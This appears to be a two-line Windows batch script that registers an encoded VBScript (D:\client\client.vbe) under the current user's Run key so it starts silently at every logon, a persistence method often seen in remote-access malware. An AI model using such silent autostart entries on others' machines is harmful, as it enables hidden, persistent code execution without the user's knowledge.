@echo off
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "client" /t REG_SZ /d "D:\client\client.vbe" /f 